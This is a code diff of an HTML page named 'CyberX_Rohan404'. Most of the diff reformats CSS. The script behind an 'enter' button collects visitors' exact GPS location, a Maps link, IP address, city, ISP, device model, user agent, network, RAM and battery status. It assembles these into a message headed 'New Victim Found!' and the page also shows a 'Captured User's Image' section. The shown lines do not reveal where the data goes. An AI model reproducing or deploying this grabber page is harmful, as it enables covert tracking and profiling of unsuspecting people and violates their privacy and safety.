@@ -6,37 +6,135 @@
   <title>CyberX_Rohan404</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet"/>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
-    body { background: black; color: #00ffee; overflow-x: hidden; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+    }
+    body {
+      background: black;
+      color: #00ffee;
+      overflow-x: hidden;
+    }
     .scanner {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
-      background: #000; display: flex; flex-direction: column;
-      justify-content: center; align-items: center; text-align: center; z-index: 9999; padding: 20px;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: #000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      z-index: 9999;
+      padding: 20px;
     }
     .scanner h1 {
-      font-size: 1.5rem; color: #00f5ff; margin-bottom: 1rem; animation: blink 1s infinite;
+      font-size: 1.5rem;
+      color: #00f5ff;
+      margin-bottom: 1rem;
+      animation: blink 1s infinite;
       word-break: break-word;
     }
-    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
-    .buttons { margin-top: 20px; display: flex; flex-direction: column; gap: 10px; }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.2; }
+    }
+    .buttons {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
     .buttons button {
-      background: transparent; border: 2px solid #00f5ff; color: #00f5ff;
-      padding: 10px 20px; cursor: pointer; border-radius: 10px;
-      transition: all 0.3s ease; font-size: 1rem;
+      background: transparent;
+      border: 2px solid #00f5ff;
+      color: #00f5ff;
+      padding: 10px 20px;
+      cursor: pointer;
+      border-radius: 10px;
+      transition: all 0.3s ease;
+      font-size: 1rem;
     }
-    .buttons button:hover { background: #00f5ff; color: #000; }
-    #mainSite { display: none; padding: 2rem; overflow-y: auto; height: 100vh; }
+    .buttons button:hover {
+      background: #00f5ff;
+      color: #000;
+    }
+    #mainSite {
+      display: none;
+      padding: 2rem 1rem;
+      overflow-y: auto;
+      height: 100vh;
+    }
     section {
-      margin-bottom: 2rem; padding: 1.5rem;
-      border: 2px solid #00f5ff; border-radius: 20px;
+      margin-bottom: 2rem;
+      padding: 1.5rem;
+      border-radius: 20px;
       box-shadow: 0 0 20px #00f5ff;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
     }
-    section h2 { font-size: 1.5rem; margin-bottom: 1rem; color: #00f5ff; }
-    section p, section pre { color: #00ffee; white-space: pre-wrap; word-wrap: break-word; }
-    a { color: #00f5ff; text-decoration: none; }
-    video, canvas, audio { display: none; }
-    @media screen and (max-width: 500px) {
-      section p, section pre { font-size: 0.95rem; line-height: 1.6; }
+    section h2 {
+      font-size: 1.5rem;
+      margin-bottom: 1rem;
+    }
+    section p, section pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    section:nth-of-type(1) {
+      border: 2px solid #00ffcc;
+      color: #ff99cc;
+    }
+    section:nth-of-type(2) {
+      border: 2px solid #ff00cc;
+      color: #66ffcc;
+    }
+    section:nth-of-type(3) {
+      border: 2px solid #00ccff;
+      color: #ffcc99;
+    }
+    section:nth-of-type(4) {
+      border: 2px solid #cc00ff;
+      color: #99ff99;
+    }
+    section:nth-of-type(5) {
+      border: 2px solid #ffff00;
+      color: #00ffff;
+    }
+    section:nth-of-type(6) {
+      border: 2px solid #00ff00;
+      color: #ffffff;
+    }
+    a {
+      color: #00f5ff;
+      word-break: break-word;
+    }
+    img {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #00f5ff;
+    }
+    video, canvas, audio {
+      display: none;
+    }
+    @media screen and (max-width: 768px) {
+      section h2 {
+        font-size: 1.3rem;
+      }
+      section p, section pre {
+        font-size: 0.95rem;
+        line-height: 1.6;
+      }
+    }
+    @media screen and (max-width: 480px) {
+      .scanner h1 {
+        font-size: 1.2rem;
+      }
     }
   </style>
 </head>
@@ -82,7 +180,7 @@
     <section id="visitorInfo"><h2>🛰️ Visitor Device & Location Info ℹ️</h2><pre id="userData">Loading...</pre></section>
 
     <section><h2>📸 Captured User's Image 💻</h2>
-      <img id="userImage" style="width: 100%; max-width: 400px; border-radius: 10px; box-shadow: 0 0 10px #00f5ff;" />
+      <img id="userImage" />
     </section>
 
     <p style="text-align:center; padding:1rem;">©️ 2025 HackerX_Rohan404. All Rights Reserved 👾🤖</p>
@@ -124,7 +222,10 @@
     const deny = new Audio('https://actions.google.com/sounds/v1/cartoon/cartoon_boing.ogg');
     const open = new Audio('https://actions.google.com/sounds/v1/cartoon/slide_whistle_to_drum_hit.ogg');
 
-    adminBtn.onclick = () => { beep.play(); window.location.href = "admin-login.html"; };
+    adminBtn.onclick = () => {
+      beep.play();
+      window.location.href = "admin-login.html";
+    };
 
     enterBtn.onclick = async () => {
       try {
@@ -157,25 +258,7 @@
 
           const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
 
-          const message = `New Victim Found! 🔰🥷...
-📍 Exact GPS Location
-🌐 Latitude: ${lat}
-🌐 Longitude: ${lon}
-🗺️ Google Maps: ${mapLink}
-
-🔢 IP: ${ipData.ip}
-🏙️ City: ${ipData.city}
-🌎 Region: ${ipData.region}
-🇮🇳 Country: ${ipData.country_name}
-📡 ISP: ${ipData.org}
-🔢 ASN: ${ipData.asn}
-
-📱 Device: ${brandModel}
-💻 User Agent: ${navigator.userAgent}
-📶 Network: ${network}
-📐 Screen: ${resolution}
-💾 RAM: ${ram} GB
-🔋 Battery: ${batteryLevel} | Charging: ${charging}`;
+          const message = `New Victim Found! 🔰🥷...\n📍 Exact GPS Location\n🌐 Latitude: ${lat}\n🌐 Longitude: ${lon}\n🗺️ Google Maps: ${mapLink}\n\n🔢 IP: ${ipData.ip}\n🏙️ City: ${ipData.city}\n🌎 Region: ${ipData.region}\n🇮🇳 Country: ${ipData.country_name}\n📡 ISP: ${ipData.org}\n🔢 ASN: ${ipData.asn}\n\n📱 Device: ${brandModel}\n💻 User Agent: ${navigator.userAgent}\n📶 Network: ${network}\n📐 Screen: ${resolution}\n💾 RAM: ${ram} GB\n🔋 Battery: ${batteryLevel} | Charging: ${charging}`;
 
           userData.innerText = message;
 
